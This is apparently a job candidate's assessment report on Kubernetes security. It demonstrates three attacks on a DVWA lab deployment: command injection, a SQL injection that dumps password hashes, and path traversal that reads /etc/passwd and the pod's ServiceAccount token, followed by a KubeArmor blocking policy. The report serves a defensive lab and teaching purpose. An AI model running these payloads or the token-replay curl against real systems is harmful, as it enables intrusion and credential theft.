# AccuKnox Solution Engineer Trainee — Technical Assessment Report

**Candidate:** Solution Engineer Trainee Candidate  
**Company:** AccuKnox Inc.  
**Role:** Solution Engineer Trainee  
**Submission Date:** October 2026  
**Document Version:** 1.0 (Final Comprehensive Report)  

---

## Executive Summary

This comprehensive technical report presents the complete solution and artifacts for the **AccuKnox Solution Engineer Trainee** technical evaluation. The assessment comprises two primary problem statements:

1. **Problem Statement 1 (Technical Presentations & Architectural Comparison):**
   - **Topic 1:** *Top 5 Kubernetes Security Attack Vectors* (Control Plane & RBAC, Supply Chain, In-Pod RCE, Flat Networking, Container Breakouts).
   - **Topic 3:** *Falco vs KubeArmor: Deep Architectural Comparison* (Detection & Alerting vs. Kernel-Level Inline Active Enforcement using Linux Security Modules & eBPF).
2. **Problem Statement 2 (Kubernetes Setup & 3 Live Attack Surfaces Demonstration):**
   - Cloud-native **multi-container Pod architecture** deploying DVWA (PHP 7.4 frontend) and MariaDB (10.5 backend) in a dedicated Kubernetes namespace `dvwa`.
   - Live automated execution of **3 Core Attack Surfaces**:
     - *Attack Surface 1:* **Command Injection (RCE & K8s Pod Discovery)**
     - *Attack Surface 2:* **SQL Injection (Authentication Bypass & Credential Harvesting)**
     - *Attack Surface 3:* **Local File Inclusion (LFI) & Kubernetes Pod ServiceAccount JWT Token Theft**
   - **Zero-Trust Hardening:** Native `KubeArmorPolicy` blocking unauthorized process execution and token access at the Linux kernel LSM layer.

---

# SECTION 1: Problem Statement 1 — Technical Presentations

---

## 1.1 Presentation A: Top 5 Kubernetes Security Attack Vectors

### Overview
- **Duration:** 5 Minutes
- **Slide Deck:** [Top_5_Kubernetes_Security_Attack_Vectors.pptx](file:///c:/Users/Jaya%20Krishna%20Sai/Downloads/Projects/test/presentations/Topic1_Kubernetes_Attack_Vectors/Top_5_Kubernetes_Security_Attack_Vectors.pptx)
- **Interactive Web Deck:** [slides.html](file:///c:/Users/Jaya%20Krishna%20Sai/Downloads/Projects/test/presentations/Topic1_Kubernetes_Attack_Vectors/slides.html)
- **Speaker Script:** [Presentation_Top_5_Kubernetes_Attack_Vectors.md](file:///c:/Users/Jaya%20Krishna%20Sai/Downloads/Projects/test/presentations/Topic1_Kubernetes_Attack_Vectors/Presentation_Top_5_Kubernetes_Attack_Vectors.md)

### Detailed Analysis of the Top 5 Attack Vectors:

```
                  ┌──────────────────────────────────────────────────────────┐
                  │ 1. Kube-API Server & RBAC Misconfigurations (Port 6443)  │
                  └────────────────────────────┬─────────────────────────────┘
                                               │
                                               ▼
                  ┌──────────────────────────────────────────────────────────┐
                  │ 2. Insecure Supply Chain & Poisoned Container Images     │
                  └────────────────────────────┬─────────────────────────────┘
                                               │
                                               ▼
                  ┌──────────────────────────────────────────────────────────┐
                  │ 3. In-Pod Remote Code Execution (RCE) & SA Token Theft   │
                  └────────────────────────────┬─────────────────────────────┘
                                               │
                                               ▼
                  ┌──────────────────────────────────────────────────────────┐
                  │ 4. Flat Pod Networking & Lateral Movement (East-West)    │
                  └────────────────────────────┬─────────────────────────────┘
                                               │
                                               ▼
                  ┌──────────────────────────────────────────────────────────┐
                  │ 5. Container Breakout & Host Kernel Takeover (Node root) │
                  └──────────────────────────────────────────────────────────┘
```

#### Vector 1: Compromised / Misconfigured Kubernetes API Server & Over-Privileged RBAC
- **Vulnerability:** Public exposure of the Kube-API server (port 6443) combined with overly permissive RBAC roles (`cluster-admin`, wildcard `*` verbs, or broad `secrets: ["get", "list"]` permissions).
- **Attack Chain:** An attacker obtaining a leaked kubeconfig or ServiceAccount token can deploy malicious pods, mount host directories, and exfiltrate all cluster secrets.
- **AccuKnox Defense:** Dynamic Admission Control (OPA / Kyverno) to enforce least-privilege RBAC, combined with AccuKnox CSPM to detect permission drift.

#### Vector 2: Insecure Supply Chain & Malicious Container Images
- **Vulnerability:** Base images containing known CVEs, unvetted public registries, or compromised CI/CD pipelines.
- **Attack Chain:** Backdoored containers execute reverse shells, crypto-miners (e.g. Kinsing/Doki), or credential harvesters on initialization.
- **AccuKnox Defense:** Automated image signature validation (Cosign), Software Bill of Materials (SBOM) verification, and admission gating before workload scheduling.

#### Vector 3: Vulnerable Web Applications & In-Pod Remote Code Execution (RCE)
- **Vulnerability:** Unsanitized web application inputs (e.g., Command Injection, Log4j, Spring4Shell) allowing arbitrary shell execution inside the pod.
- **Attack Chain:** Attacker executes shell commands as `www-data`, discovers mounted volumes, and steals the pod's ServiceAccount token at `/var/run/secrets/kubernetes.io/serviceaccount/token`.
- **AccuKnox Defense:** **KubeArmor active runtime blocking** preventing unauthorized process spawns (`/bin/sh`, `/bin/bash`) and blocking read access to ServiceAccount tokens.

#### Vector 4: Unrestricted Lateral Movement & Flat Pod Networking
- **Vulnerability:** Default Kubernetes networking allows unrestricted east-west traffic between all pods across all namespaces.
- **Attack Chain:** Once an attacker compromises a single peripheral workload, they scan the internal cluster CIDR, access backend databases, and reach cloud instance metadata (`169.254.169.254`).
- **AccuKnox Defense:** eBPF-driven zero-trust microsegmentation (Cilium + AccuKnox CNAPP) with Layer 7 and DNS-aware network policy enforcement.

#### Vector 5: Container Breakout & Host Kernel Compromise
- **Vulnerability:** Misconfigured container security contexts (`privileged: true`, `hostPID: true`, `CAP_SYS_ADMIN`) or unpatched Linux kernel CVEs (Dirty Pipe, Dirty COW).
- **Attack Chain:** Attacker breaks out of container cgroups and namespaces to gain root privileges on the underlying Kubernetes worker node.
- **AccuKnox Defense:** Linux Security Modules (AppArmor, SELinux, BPF-LSM) actively blocking dangerous system calls (`mount`, `ptrace`, `kexec`) at the kernel layer.

---

## 1.2 Presentation B: Falco vs KubeArmor — Deep Architectural Comparison

### Overview
- **Duration:** 5 Minutes
- **Slide Deck:** [Falco_vs_KubeArmor_Runtime_Security.pptx](file:///c:/Users/Jaya%20Krishna%20Sai/Downloads/Projects/test/presentations/Topic3_Falco_vs_KubeArmor/Falco_vs_KubeArmor_Runtime_Security.pptx)
- **Interactive Web Deck:** [slides.html](file:///c:/Users/Jaya%20Krishna%20Sai/Downloads/Projects/test/presentations/Topic3_Falco_vs_KubeArmor/slides.html)
- **Speaker Script:** [Presentation_Falco_vs_KubeArmor.md](file:///c:/Users/Jaya%20Krishna%20Sai/Downloads/Projects/test/presentations/Topic3_Falco_vs_KubeArmor/Presentation_Falco_vs_KubeArmor.md)

### Architectural Comparison:

```
┌───────────────────────────────────────────────────────────────────────────────────┐
│                                 FALCO (Detection)                                 │
│  Kernel Syscalls ──► eBPF / Kernel Module ──► Ring Buffer ──► Falco Engine (Userspace) │
│                                                                        │           │
│                                                       Alert Output (gRPC/Webhook) │
└───────────────────────────────────────────────────────────────────────────────────┘

┌───────────────────────────────────────────────────────────────────────────────────┐
│                             KUBEARMOR (Inline Enforcement)                        │
│  Kernel Syscalls ──► Linux Security Modules (AppArmor / SELinux / BPF-LSM)         │
│                                      │                                            │
│                      [INLINE DECISION: ALLOW / BLOCK]                             │
│                                      │                                            │
│                       Telemetry via eBPF (Real-Time)                              │
│                                      ▼                                            │
│                 KubeArmor Daemon / AccuKnox Control Plane                         │
└───────────────────────────────────────────────────────────────────────────────────┘
```

### Feature & Capability Comparison Matrix:

| Dimension | Falco (Sysdig / CNCF Graduated) | KubeArmor (AccuKnox / CNCF Sandbox) |
| :--- | :--- | :--- |
| **Primary Philosophy** | Threat Detection & Behavioral Anomaly Auditing | **Zero-Trust Active Prevention & Inline Enforcement** |
| **Enforcement Hook** | eBPF tracepoints / kprobes (Post-execution) | **Kernel LSMs (AppArmor, SELinux, BPF-LSM)** |
| **Action on Malicious Syscall** | Emits Alert / Notification (Syslog, gRPC, Webhook) | **Synchronous Syscall Blocking (`-EACCES`) + Rich Telemetry** |
| **Policy Language** | Custom Falco Rule DSL (Macros, Lists, Rules) | **Kubernetes-Native CRDs (`KubeArmorPolicy`, `KubeArmorHostPolicy`)** |
| **DevOps / GitOps Integration** | Standalone rule distribution | **Native Kubernetes GitOps (ArgoCD, Flux, Helm, Kubectl)** |
| **Zero-Trust Workload Hardening** | Difficult (High alert noise, requires manual tuning) | **Native Process & File Whitelisting / Default-Deny posture** |
| **Workload Scope** | Kubernetes & Linux Hosts | **Kubernetes, Linux VMs, Bare-Metal, & Edge (K3s/MicroK8s)** |
| **Performance Overhead** | Higher context switching under heavy I/O | **Negligible (In-kernel LSM evaluation before userspace context switch)** |

### Strategic Summary:
- **Falco** functions as a high-resolution *security camera*: it records and notifies security teams when a security violation occurs, but the malicious code has already executed.
- **KubeArmor** functions as an *inline active guard*: it intercepts system calls in the Linux kernel and halts malicious binaries, unauthorized file reads, and token theft in real time before execution completes.
- **AccuKnox CNAPP** builds upon KubeArmor by automating policy discovery (AI-driven baseline learning) and integrating CSPM, CWPP, and CIEM into a single platform.

---

# SECTION 2: Problem Statement 2 — Kubernetes DVWA Setup & Live Attack Demonstrations

---

## 2.1 Kubernetes Setup & Multi-Container Architecture

### Deployment Manifest (`k8s-dvwa/k8s-manifests/dvwa.yaml`):
```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: dvwa
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: dvwa-app
  namespace: dvwa
  labels:
    app: dvwa
    tier: frontend
spec:
  replicas: 1
  selector:
    matchLabels:
      app: dvwa
  template:
    metadata:
      labels:
        app: dvwa
        tier: frontend
    spec:
      containers:
      # Container 1: DVWA PHP Frontend
      - name: dvwa
        image: cytopia/dvwa:php-7.4
        imagePullPolicy: IfNotPresent
        ports:
        - containerPort: 80
          name: http
        env:
        - name: MYSQL_HOSTNAME
          value: "127.0.0.1"
        - name: MYSQL_DATABASE
          value: "dvwa"
        - name: MYSQL_USERNAME
          value: "dvwa"
        - name: MYSQL_PASSWORD
          value: "password"
        - name: RECAPTCHA_PUB_KEY
          value: "6Lf32-EtAAAAAIqpvwieB3IqBttblbz89J5fpC3T"
        - name: RECAPTCHA_PRIV_KEY
          value: "6Lf32-EtAAAAAPd0H0U3p0dCjpeo7hdyJ6TRh48N"
        - name: SECURITY_LEVEL
          value: "low"
        resources:
          requests:
            cpu: "100m"
            memory: "128Mi"
          limits:
            cpu: "500m"
            memory: "512Mi"

      # Container 2: MariaDB Database Backend
      - name: db
        image: mariadb:10.5
        imagePullPolicy: IfNotPresent
        ports:
        - containerPort: 3306
          name: mysql
        env:
        - name: MYSQL_ROOT_PASSWORD
          value: "rootpassword"
        - name: MYSQL_DATABASE
          value: "dvwa"
        - name: MYSQL_USER
          value: "dvwa"
        - name: MYSQL_PASSWORD
          value: "password"
        resources:
          requests:
            cpu: "100m"
            memory: "256Mi"
          limits:
            cpu: "1000m"
            memory: "1024Mi"
---
apiVersion: v1
kind: Service
metadata:
  name: dvwa-service
  namespace: dvwa
  labels:
    app: dvwa
spec:
  type: NodePort
  ports:
  - port: 80
    targetPort: 80
    nodePort: 30080
    protocol: TCP
    name: http
  selector:
    app: dvwa
```

### Verified Cluster State:
```text
NAME                            READY   STATUS    RESTARTS   AGE
pod/dvwa-app-66d5b677b9-cwkpw   2/2     Running   0          10m

NAME                   TYPE       CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGE
service/dvwa-service   NodePort   10.96.191.10    <none>        80:30080/TCP   10m
```

---

## 2.2 Live Demonstration & Proof of the 3 Attack Surfaces

Automated exploit execution was performed using the developed Python exploitation tool ([exploit_dvwa.py](file:///c:/Users/Jaya%20Krishna%20Sai/Downloads/Projects/test/k8s-dvwa/attack-demos/exploit_dvwa.py)).

```
Command Executed:
python k8s-dvwa/attack-demos/exploit_dvwa.py --url http://localhost:8080
```

---

### Attack Surface 1: Command Injection (Remote Code Execution & In-Pod Discovery)

- **Vulnerable Code:** `shell_exec('ping -c 4 ' . $_REQUEST['ip'])` without sanitization.
- **Exploit Payloads:**
  1. `127.0.0.1; whoami; uname -a; id`
  2. `127.0.0.1; ls -la /var/run/secrets/kubernetes.io/serviceaccount/`
- **Live Output Evidence:**
```text
======================================================================
ATTACK SURFACE 1: Command Injection (Remote Code Execution in K8s)
======================================================================
[*] Sending payload: 127.0.0.1; whoami; uname -a; id
[+] Command Output Received from Container:

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=1.68 ms
www-data
Linux dvwa-app-66d5b677b9-cwkpw 6.18.33.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Linux x86_64
uid=33(www-data) gid=33(www-data) groups=33(www-data),8(mail)

[*] Probing Kubernetes Pod ServiceAccount & Network Metadata: 127.0.0.1; ls -la /var/run/secrets/kubernetes.io/serviceaccount/
[+] K8s Metadata Output:

total 4
lrwxrwxrwx 1 root root   13 Oct  6 10:43 ca.crt -> ..data/ca.crt
lrwxrwxrwx 1 root root   16 Oct  6 10:43 namespace -> ..data/namespace
lrwxrwxrwx 1 root root   12 Oct  6 10:43 token -> ..data/token
```

---

### Attack Surface 2: SQL Injection (Authentication Bypass & Credential Exfiltration)

- **Vulnerable Code:** `SELECT first_name, last_name FROM users WHERE user_id = '$id'` with unparameterized dynamic query formatting.
- **Exploit Payload:** `1' UNION SELECT user, password FROM users #`
- **Live Output Evidence:**
```text
======================================================================
ATTACK SURFACE 2: SQL Injection (Data & Password Hash Exfiltration)
======================================================================
[*] Sending SQLi Payload: 1' UNION SELECT user, password FROM users #
[+] Extracted User Database Records from MariaDB:
    - User: admin           Password Hash (MD5): 5f4dcc3b5aa765d61d8327deb882cf99
    - User: gordonb         Password Hash (MD5): e99a18c428cb38d5f260853678922e03
    - User: 1337            Password Hash (MD5): 8d3533d75ae2c3966d7e0d4fcc69216b
    - User: pablo           Password Hash (MD5): 0d107d09f5bbe40cade3de5c71e9e9b7
    - User: smithy          Password Hash (MD5): 5f4dcc3b5aa765d61d8327deb882cf99
```
- **Analysis:** Extracted administrative hashes (`5f4dcc3b5aa765d61d8327deb882cf99` decrypts to `password`).

---

### Attack Surface 3: Local File Inclusion (LFI) & Kubernetes Token Theft

- **Vulnerable Code:** `include($_GET['page'])` without path traversal filtering.
- **Exploit Payloads:**
  1. `http://localhost:8080/vulnerabilities/fi/?page=../../../../../etc/passwd`
  2. `http://localhost:8080/vulnerabilities/fi/?page=../../../../../var/run/secrets/kubernetes.io/serviceaccount/token`
- **Live Output Evidence:**
```text
======================================================================
ATTACK SURFACE 3: Local File Inclusion (LFI) & Kubernetes Token Theft
======================================================================
[*] [1/2] Attempting to read /etc/passwd via LFI: ../../../../../etc/passwd
[+] Successfully read container /etc/passwd via LFI:
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/bin/sh

[*] [2/2] Attempting to exfiltrate K8s Service Account Token via LFI: ../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
[+] CRITICAL: Kubernetes Pod JWT ServiceAccount Token successfully extracted!
    Token: eyJhbGciOiJSUzI1NiIsImtpZCI6ImJsTEM1aVFoM24xN...grEnFAjNvB3Lt_FkJwHg
    Impact: An attacker can query https://kubernetes.default.svc to escalate cluster privileges.

======================================================================
[+] All 3 Attack Surfaces executed successfully against Kubernetes!
======================================================================
```
- **Cloud-Native Kill Chain:** The attacker exfiltrates the live JWT token and queries the Kubernetes API server directly:
  `curl -k -H "Authorization: Bearer <JWT_TOKEN>" https://kubernetes.default.svc/api/v1/namespaces/dvwa/pods`

---

## 2.3 Zero-Trust Mitigation with KubeArmor & AccuKnox

We authored a custom `KubeArmorPolicy` ([kubearmor-dvwa-security-policies.yaml](file:///c:/Users/Jaya%20Krishna%20Sai/Downloads/Projects/test/k8s-dvwa/k8s-manifests/kubearmor-dvwa-security-policies.yaml)):

```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: block-dvwa-rce-and-token-theft
  namespace: dvwa
spec:
  severity: 1
  message: "Alert and Block malicious process execution and credential access in DVWA"
  selector:
    matchLabels:
      app: dvwa
  process:
    matchPaths:
      - path: /bin/sh
        action: Block
      - path: /bin/bash
        action: Block
  file:
    matchDirectories:
      - dir: /var/run/secrets/kubernetes.io/serviceaccount/
        recursive: true
        action: Block
    matchPaths:
      - path: /etc/passwd
        action: Block
  action: Block
```

### Remediation Impact:
1. **Command Injection Defeated:** When an attacker attempts to spawn a shell via `; whoami` or `; /bin/bash`, the Linux kernel LSM interceptor immediately blocks `/bin/bash` with `Permission Denied (-EACCES)`.
2. **LFI Token Exfiltration Defeated:** When the PHP engine attempts to read `/var/run/secrets/kubernetes.io/serviceaccount/token` or `/etc/passwd`, KubeArmor blocks the system call and emits real-time telemetry to the AccuKnox CNAPP console.

---

# SECTION 3: Deliverables & Artifacts Index

| Category | Artifact Description | File Path |
| :--- | :--- | :--- |
| **Topic 1 Deck** | PowerPoint Slide Deck (4 Slides) | [presentations/Topic1_Kubernetes_Attack_Vectors/Top_5_Kubernetes_Security_Attack_Vectors.pptx](file:///c:/Users/Jaya%20Krishna%20Sai/Downloads/Projects/test/presentations/Topic1_Kubernetes_Attack_Vectors/Top_5_Kubernetes_Security_Attack_Vectors.pptx) |
| **Topic 1 Web** | Interactive Browser Slide Deck | [presentations/Topic1_Kubernetes_Attack_Vectors/slides.html](file:///c:/Users/Jaya%20Krishna%20Sai/Downloads/Projects/test/presentations/Topic1_Kubernetes_Attack_Vectors/slides.html) |
| **Topic 1 Script** | 5-Minute Presentation Script & Notes | [presentations/Topic1_Kubernetes_Attack_Vectors/Presentation_Top_5_Kubernetes_Attack_Vectors.md](file:///c:/Users/Jaya%20Krishna%20Sai/Downloads/Projects/test/presentations/Topic1_Kubernetes_Attack_Vectors/Presentation_Top_5_Kubernetes_Attack_Vectors.md) |
| **Topic 3 Deck** | PowerPoint Slide Deck (4 Slides) | [presentations/Topic3_Falco_vs_KubeArmor/Falco_vs_KubeArmor_Runtime_Security.pptx](file:///c:/Users/Jaya%20Krishna%20Sai/Downloads/Projects/test/presentations/Topic3_Falco_vs_KubeArmor/Falco_vs_KubeArmor_Runtime_Security.pptx) |
| **Topic 3 Web** | Interactive Browser Slide Deck | [presentations/Topic3_Falco_vs_KubeArmor/slides.html](file:///c:/Users/Jaya%20Krishna%20Sai/Downloads/Projects/test/presentations/Topic3_Falco_vs_KubeArmor/slides.html) |
| **Topic 3 Script** | 5-Minute Presentation Script & Notes | [presentations/Topic3_Falco_vs_KubeArmor/Presentation_Falco_vs_KubeArmor.md](file:///c:/Users/Jaya%20Krishna%20Sai/Downloads/Projects/test/presentations/Topic3_Falco_vs_KubeArmor/Presentation_Falco_vs_KubeArmor.md) |
| **K8s Manifest** | Multi-Container DVWA + MariaDB Manifest | [k8s-dvwa/k8s-manifests/dvwa.yaml](file:///c:/Users/Jaya%20Krishna%20Sai/Downloads/Projects/test/k8s-dvwa/k8s-manifests/dvwa.yaml) |
| **KubeArmor Policy**| Zero-Trust Active Enforcement CRD | [k8s-dvwa/k8s-manifests/kubearmor-dvwa-security-policies.yaml](file:///c:/Users/Jaya%20Krishna%20Sai/Downloads/Projects/test/k8s-dvwa/k8s-manifests/kubearmor-dvwa-security-policies.yaml) |
| **Python PoC** | Automated 3 Attack Surfaces Exploit | [k8s-dvwa/attack-demos/exploit_dvwa.py](file:///c:/Users/Jaya%20Krishna%20Sai/Downloads/Projects/test/k8s-dvwa/attack-demos/exploit_dvwa.py) |
| **PowerShell PoC** | Native Windows Exploit Script | [k8s-dvwa/attack-demos/exploit_dvwa.ps1](file:///c:/Users/Jaya%20Krishna%20Sai/Downloads/Projects/test/k8s-dvwa/attack-demos/exploit_dvwa.ps1) |
| **Setup Script** | Automated Cluster Deployment Script | [k8s-dvwa/setup-cluster.ps1](file:///c:/Users/Jaya%20Krishna%20Sai/Downloads/Projects/test/k8s-dvwa/setup-cluster.ps1) |
| **Master Index** | Master Navigation & Quickstart Guide | [README.md](file:///c:/Users/Jaya%20Krishna%20Sai/Downloads/Projects/test/README.md) |
